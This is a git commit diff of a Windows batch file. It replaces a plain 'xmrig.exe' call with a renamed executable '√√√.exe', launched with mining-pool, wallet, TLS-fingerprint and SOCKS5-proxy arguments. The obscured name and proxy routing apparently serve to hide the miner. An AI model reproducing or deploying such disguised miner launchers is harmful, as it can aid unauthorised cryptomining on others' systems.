64427bc1ac7063ac2192e338303992a9043a34c2
Uytt654 <88240271+Uytt654@users.noreply.github.com>
2021-08-03 21:37:41 +0700

    Update √.cmd

--- √.cmd
+++ √.cmd
@@ -1,3 +1,3 @@
 @echo off
-xmrig.exe
+√√√.exe --url pool.hashvault.pro:80 --user TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps.57b556a426f1d8edc56d41fbda69d9f6a1d4e2d55f53d955e2b0dc17b1599cee --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -x socks5://174.64.199.79:4145 
 pause
